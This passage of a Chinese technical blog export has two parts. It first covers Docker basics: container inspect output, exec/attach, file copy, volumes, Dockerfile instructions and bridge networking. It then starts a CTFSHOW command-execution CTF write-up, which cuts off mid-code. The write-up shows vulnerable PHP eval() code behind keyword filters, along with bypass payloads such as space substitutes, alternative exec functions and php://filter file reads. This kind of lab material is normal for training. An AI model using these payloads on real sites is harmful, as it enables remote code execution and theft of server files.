0,</span><br><span class="line">            &quot;CpuRealtimePeriod&quot;: 0,</span><br><span class="line">            &quot;CpuRealtimeRuntime&quot;: 0,</span><br><span class="line">            &quot;CpusetCpus&quot;: &quot;&quot;,</span><br><span class="line">            &quot;CpusetMems&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Devices&quot;: [],</span><br><span class="line">            &quot;DeviceCgroupRules&quot;: null,</span><br><span class="line">            &quot;DeviceRequests&quot;: null,</span><br><span class="line">            &quot;MemoryReservation&quot;: 0,</span><br><span class="line">            &quot;MemorySwap&quot;: 0,</span><br><span class="line">            &quot;MemorySwappiness&quot;: null,</span><br><span class="line">            &quot;OomKillDisable&quot;: null,</span><br><span class="line">            &quot;PidsLimit&quot;: null,</span><br><span class="line">            &quot;Ulimits&quot;: null,</span><br><span class="line">            &quot;CpuCount&quot;: 0,</span><br><span class="line">            &quot;CpuPercent&quot;: 0,</span><br><span class="line">            &quot;IOMaximumIOps&quot;: 0,</span><br><span class="line">            &quot;IOMaximumBandwidth&quot;: 0,</span><br><span class="line">            &quot;MaskedPaths&quot;: [</span><br><span class="line">                &quot;/proc/asound&quot;,</span><br><span class="line">                &quot;/proc/acpi&quot;,</span><br><span class="line">                &quot;/proc/kcore&quot;,</span><br><span class="line">                &quot;/proc/keys&quot;,</span><br><span class="line">                &quot;/proc/latency_stats&quot;,</span><br><span class="line">                &quot;/proc/timer_list&quot;,</span><br><span class="line">                &quot;/proc/timer_stats&quot;,</span><br><span class="line">                &quot;/proc/sched_debug&quot;,</span><br><span class="line">                &quot;/proc/scsi&quot;,</span><br><span class="line">                &quot;/sys/firmware&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;ReadonlyPaths&quot;: [</span><br><span class="line">                &quot;/proc/bus&quot;,</span><br><span class="line">                &quot;/proc/fs&quot;,</span><br><span class="line">                &quot;/proc/irq&quot;,</span><br><span class="line">                &quot;/proc/sys&quot;,</span><br><span class="line">                &quot;/proc/sysrq-trigger&quot;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;GraphDriver&quot;: &#123;</span><br><span class="line">            &quot;Data&quot;: &#123;</span><br><span class="line">                &quot;LowerDir&quot;: &quot;/var/lib/docker/overlay2/c9454e1ec7fc3995647ce3a55dbea69b4c131ca8a3caa0c07b20926a120200ef-init/diff:/var/lib/docker/overlay2/8571a344881bf2c24077842c315b73805dfcfab1dc0ea87c2fc32f8fb60c05a5/diff&quot;,</span><br><span class="line">                &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/c9454e1ec7fc3995647ce3a55dbea69b4c131ca8a3caa0c07b20926a120200ef/merged&quot;,</span><br><span class="line">                &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/c9454e1ec7fc3995647ce3a55dbea69b4c131ca8a3caa0c07b20926a120200ef/diff&quot;,</span><br><span class="line">                &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/c9454e1ec7fc3995647ce3a55dbea69b4c131ca8a3caa0c07b20926a120200ef/work&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Name&quot;: &quot;overlay2&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Mounts&quot;: [],</span><br><span class="line">        &quot;Config&quot;: &#123;</span><br><span class="line">            &quot;Hostname&quot;: &quot;e6f07538e8c5&quot;,</span><br><span class="line">            &quot;Domainname&quot;: &quot;&quot;,</span><br><span class="line">            &quot;User&quot;: &quot;&quot;,</span><br><span class="line">            &quot;AttachStdin&quot;: true,</span><br><span class="line">            &quot;AttachStdout&quot;: true,</span><br><span class="line">            &quot;AttachStderr&quot;: true,</span><br><span class="line">            &quot;Tty&quot;: true,</span><br><span class="line">            &quot;OpenStdin&quot;: true,</span><br><span class="line">            &quot;StdinOnce&quot;: true,</span><br><span class="line">            &quot;Env&quot;: [</span><br><span class="line">                &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Cmd&quot;: [</span><br><span class="line">                &quot;/bin/bash&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Image&quot;: &quot;centos&quot;,</span><br><span class="line">            &quot;Volumes&quot;: null,</span><br><span class="line">            &quot;WorkingDir&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Entrypoint&quot;: null,</span><br><span class="line">            &quot;OnBuild&quot;: null,</span><br><span class="line">            &quot;Labels&quot;: &#123;</span><br><span class="line">                &quot;org.label-schema.build-date&quot;: &quot;20210915&quot;,</span><br><span class="line">                &quot;org.label-schema.license&quot;: &quot;GPLv2&quot;,</span><br><span class="line">                &quot;org.label-schema.name&quot;: &quot;CentOS Base Image&quot;,</span><br><span class="line">                &quot;org.label-schema.schema-version&quot;: &quot;1.0&quot;,</span><br><span class="line">                &quot;org.label-schema.vendor&quot;: &quot;CentOS&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;NetworkSettings&quot;: &#123;</span><br><span class="line">            &quot;Bridge&quot;: &quot;&quot;,</span><br><span class="line">            &quot;SandboxID&quot;: &quot;898ddea5e68fc6ecc060e39bf199f3fb1604345cfb755eb1fdc4a4eb20951040&quot;,</span><br><span class="line">            &quot;HairpinMode&quot;: false,</span><br><span class="line">            &quot;LinkLocalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LinkLocalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;Ports&quot;: &#123;&#125;,</span><br><span class="line">            &quot;SandboxKey&quot;: &quot;/var/run/docker/netns/898ddea5e68f&quot;,</span><br><span class="line">            &quot;SecondaryIPAddresses&quot;: null,</span><br><span class="line">            &quot;SecondaryIPv6Addresses&quot;: null,</span><br><span class="line">            &quot;EndpointID&quot;: &quot;c0a5e05462958270eff0b04f98e5da26d12116a2a7e7812cd91778af56e09742&quot;,</span><br><span class="line">            &quot;Gateway&quot;: &quot;172.17.0.1&quot;,</span><br><span class="line">            &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,</span><br><span class="line">            &quot;IPPrefixLen&quot;: 16,</span><br><span class="line">            &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">            &quot;MacAddress&quot;: &quot;02:42:ac:11:00:02&quot;,</span><br><span class="line">            &quot;Networks&quot;: &#123;</span><br><span class="line">                &quot;bridge&quot;: &#123;</span><br><span class="line">                    &quot;IPAMConfig&quot;: null,</span><br><span class="line">                    &quot;Links&quot;: null,</span><br><span class="line">                    &quot;Aliases&quot;: null,</span><br><span class="line">                    &quot;NetworkID&quot;: &quot;65babaf968c065c92670e40836610c43f70520c4fd791b6def2ba131feb5fc00&quot;,</span><br><span class="line">                    &quot;EndpointID&quot;: &quot;c0a5e05462958270eff0b04f98e5da26d12116a2a7e7812cd91778af56e09742&quot;,</span><br><span class="line">                    &quot;Gateway&quot;: &quot;172.17.0.1&quot;,</span><br><span class="line">                    &quot;IPAddress&quot;: &quot;172.17.0.2&quot;,</span><br><span class="line">                    &quot;IPPrefixLen&quot;: 16,</span><br><span class="line">                    &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">                    &quot;MacAddress&quot;: &quot;02:42:ac:11:00:02&quot;,</span><br><span class="line">                    &quot;DriverOpts&quot;: null</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><strong>进入当前正在运行的容器</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">我们通常容器都是后台方式运作的，需要进入容器，修改一些配置</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令</span></span><br><span class="line">docker exec -it 容器id bashshell</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试</span></span><br><span class="line">root@lemon-virtual-machine:/# docker exec -it e6f07538e8c5 /bin/bash</span><br><span class="line">[root@e6f07538e8c5 /]# ls</span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line">[root@e6f07538e8c5 /]# ps -ef</span><br><span class="line">UID          PID    PPID  C STIME TTY          TIME CMD</span><br><span class="line">root           1       0  0 09:52 pts/0    00:00:00 /bin/bash</span><br><span class="line">root          15       0  0 10:04 pts/1    00:00:00 /bin/bash</span><br><span class="line">root          30      15  0 10:04 pts/1    00:00:00 ps -ef</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">方式二</span></span><br><span class="line">docker attach 容器id</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试</span></span><br><span class="line">root@lemon-virtual-machine:/# docker attach e6f07538e8c5</span><br><span class="line">正在执行当前的代码...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker <span class="built_in">exec</span><span class="comment"># 进入容器后开启一个新的终端，可以在里面操作 (常用)</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker attach<span class="comment"># 进入容器正在执行的终端，不会启动新的进程</span></span></span><br></pre></td></tr></table></figure><p><strong>从容器内拷贝文件到主机上</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">![2](/imgs/2.png)docker cp 容器id:容器内路径 目的主机路径</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前主机目录下</span></span><br><span class="line">root@lemon-virtual-machine:/home# touch 1.php</span><br><span class="line">root@lemon-virtual-machine:/home# ls</span><br><span class="line">1.php  lemon</span><br><span class="line">root@lemon-virtual-machine:/home# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS          PORTS     NAMES</span><br><span class="line">e6f07538e8c5   centos    &quot;/bin/bash&quot;   21 minutes ago   Up 20 minutes             frosty_goldwasser</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入docker容器内部</span></span><br><span class="line">root@lemon-virtual-machine:/home# docker attach e6f07538e8c5  </span><br><span class="line">[root@e6f07538e8c5 /]# cd home</span><br><span class="line">[root@e6f07538e8c5 home]# ls</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在容器内新建一个文件</span></span><br><span class="line">[root@e6f07538e8c5 home]# touch 2.php</span><br><span class="line">[root@e6f07538e8c5 home]# ls</span><br><span class="line">2.php</span><br><span class="line">[root@e6f07538e8c5 home]# exit       </span><br><span class="line">exit</span><br><span class="line">root@lemon-virtual-machine:/home# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">root@lemon-virtual-machine:/home# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS                          PORTS     NAMES</span><br><span class="line">e6f07538e8c5   centos    &quot;/bin/bash&quot;   24 minutes ago   Exited (0) About a minute ago             frosty_goldwasser</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将文件拷贝出来到主机上</span></span><br><span class="line">root@lemon-virtual-machine:/home# docker cp e6f07538e8c5:/home/2.php /home</span><br><span class="line">Successfully copied 1.54kB to /home</span><br><span class="line">root@lemon-virtual-machine:/home# ls</span><br><span class="line">1.php  2.php  lemon</span><br></pre></td></tr></table></figure><h1 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h1><p><strong>容器的持久化和同步操作！容器间也是可以数据共享的！</strong></p><h2 id="使用数据卷"><a href="#使用数据卷" class="headerlink" title="使用数据卷"></a>使用数据卷</h2><blockquote><p>方式一：直接使用命令来挂载 -v</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v 主机目录:容器内目录</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试</span></span><br><span class="line">root@lemon-virtual-machine:/home# docker run -it -v /home/ceshi:/home centos /bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过docker inspect 容器<span class="built_in">id</span> 测试是否挂载成功</span></span><br><span class="line">&quot;Mounts&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;Type&quot;: &quot;bind&quot;,</span><br><span class="line">                &quot;Source&quot;: &quot;/home/ceshi&quot;,# 主机内地址</span><br><span class="line">                &quot;Destination&quot;: &quot;/home&quot;,# docker容器内地址</span><br><span class="line">                &quot;Mode&quot;: &quot;&quot;,</span><br><span class="line">                &quot;RW&quot;: true,</span><br><span class="line">                &quot;Propagation&quot;: &quot;rprivate&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试文件同步，同步的时候双向绑定</span></span><br><span class="line"></span><br><span class="line">[root@52ae30c66f73 home]# ls</span><br><span class="line">[root@52ae30c66f73 home]# touch 1.php</span><br><span class="line">[root@52ae30c66f73 home]# ls</span><br><span class="line">1.php</span><br><span class="line">[root@52ae30c66f73 home]# ls</span><br><span class="line">1.php  2.php</span><br><span class="line"></span><br><span class="line">root@lemon-virtual-machine:/home/ceshi# ls</span><br><span class="line">root@lemon-virtual-machine:/home/ceshi# ls</span><br><span class="line">1.php</span><br><span class="line">root@lemon-virtual-machine:/home/ceshi# touch 2.php</span><br><span class="line">root@lemon-virtual-machine:/home/ceshi# ls</span><br><span class="line">1.php  2.php</span><br></pre></td></tr></table></figure><p><strong>假设将容器删除，我们挂载到本地的数据卷依旧没有丢失，实现了容器数据持久化功能</strong></p><h1 id="DockerFile"><a href="#DockerFile" class="headerlink" title="DockerFile"></a>DockerFile</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>DockerFile是用来构建docker镜像的文件！命令参数脚本！</p></blockquote><p><strong>构建步骤：</strong></p><ol><li>编写一个dockerfile文件</li><li>docker build构建成为一个镜像</li><li>docker run运行镜像</li><li>docker push 发布镜像（DockerHub、阿里云镜像仓库）</li></ol><h2 id="DockerFIle构建过程"><a href="#DockerFIle构建过程" class="headerlink" title="DockerFIle构建过程"></a>DockerFIle构建过程</h2><p><strong>基础知识：</strong></p><ol><li>每个保留关键字（指令）都必须是大写字母</li><li>执行从上到下顺序执行</li><li>#  表示注释</li><li>每一个指令都会创建一个提交一个新的镜像层，并提交！</li></ol><h2 id="DockerFile的指令"><a href="#DockerFile的指令" class="headerlink" title="DockerFile的指令"></a>DockerFile的指令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FROM# 基础镜像，一切从这里开始构建</span><br><span class="line">MAINTAINER# 镜像是谁写的，姓名+邮箱</span><br><span class="line">RUN# 镜像构建的时候需要运行的命令</span><br><span class="line">ADD# 步骤，添加内容</span><br><span class="line">WORDDIR# 镜像的工作目录</span><br><span class="line">VOLUME# 挂载的目录</span><br><span class="line">EXPOSE# 暴露端口</span><br><span class="line">CMD# 指定这个容器启动的时候运行的命令，只有最后一个会生效，可被替代</span><br><span class="line">ENTRYPOINT# 指定这个容器启动的时候运行的命令，可以追加命令</span><br><span class="line">ONBUILD# 当构建一个被继承DockerFile这个时候就会运行ONBUILD的指令，触发指令</span><br><span class="line">COPY# 类似ADD，将文件拷贝到镜像中</span><br><span class="line">ENV# 构建的时候设置环境变量</span><br></pre></td></tr></table></figure><h1 id="Docker网络"><a href="#Docker网络" class="headerlink" title="Docker网络"></a>Docker网络</h1><h2 id="理解Docker0"><a href="#理解Docker0" class="headerlink" title="理解Docker0"></a>理解Docker0</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@lemon-virtual-machine:/# ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo# 本机回环地址</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:62:7f:25 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    altname enp2s1</span><br><span class="line">    inet 192.168.17.133/24 brd 192.168.17.255 scope global dynamic noprefixroute ens33# 内网地址</span><br><span class="line">       valid_lft 1198sec preferred_lft 1198sec</span><br><span class="line">    inet6 fe80::d486:4c41:fe68:5cae/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default </span><br><span class="line">    link/ether 02:42:5e:55:89:c5 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0# docker0地址</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:5eff:fe55:89c5/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><blockquote><p>问题：docker是如何处理容器网络访问的？</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">root@lemon-virtual-machine:/<span class="comment"># docker run -d -P --name tomcat01 tomcat</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看容器的内部网络地址ip addr</span></span><br><span class="line">root@lemon-virtual-machine:/# docker exec -it tomcat01 ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">10: eth0@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><blockquote><p>原理</p><p>每启动一个docker容器，docker就会给docker容器分配一个ip，我们只要安装了docker，就会有一个docker0桥接模式，使用的技术是evth-pair技术！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-命令执行</title>
      <link href="/2023/07/26/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/07/26/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web29-关键字绕过"><a href="#web29-关键字绕过" class="headerlink" title="web29(关键字绕过)"></a>web29(关键字绕过)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=system(&quot;cat f*&quot;);</code></p><ul><li>发现<code>flag</code>被过滤了，可以利用正则匹配绕过</li></ul><h1 id="web30-关键字绕过"><a href="#web30-关键字绕过" class="headerlink" title="web30(关键字绕过)"></a>web30(关键字绕过)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: echo`cat f*` </code></p><ul><li>将<code>system</code>过滤了，可以使用与其功能相同的函数，将命令执行的结果输出出来</li></ul><blockquote><p>exec()<br>shell_exec()&amp;(``)<br>passthru()<br>pcntl_exec()<br>popen()<br>proc_open()</p></blockquote><h1 id="web31-关键字绕过"><a href="#web31-关键字绕过" class="headerlink" title="web31(关键字绕过)"></a>web31(关键字绕过)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=echo`tac%09f*`;</code></p><ul><li>过滤了<code>cat</code>，可以利用以下函数</li></ul><blockquote><p>more     #一页一页的显示档案内容<br>less     #与 more 类似<br>head     #查看头几行<br>tac      #从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail     #查看尾几行<br>nl       #显示的时候，顺便输出行号<br>od       #以二进制的方式读取档案内容<br>sort     #可以查看<br>uniq     #可以查看</p></blockquote><ul><li>过滤了空格，可以用其它字符替代</li></ul><blockquote><p>&lt;<br>${IFS}<br>/**/<br>%09</p></blockquote><h1 id="web32-关键字绕过"><a href="#web32-关键字绕过" class="headerlink" title="web32(关键字绕过)"></a>web32(关键字绕过)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=include%0a$_POST[1]?&gt;    POST: 1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><ul><li>发现本题将大部分函数都过滤了，正常的命令执行也不太容易，这时候可以利用文件包含，将想要读取的文件利用POST数据进行传递</li><li>将GET参数设置为include，进行文件包含，包含的内容可以用POST传参</li><li>在POST中利用伪协议读取数据，进行解码，得到flag</li><li><code>;</code>可以用<code>?&gt;</code> 代替</li></ul><h1 id="web33"><a href="#web33" class="headerlink" title="web33()"></a>web33()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span 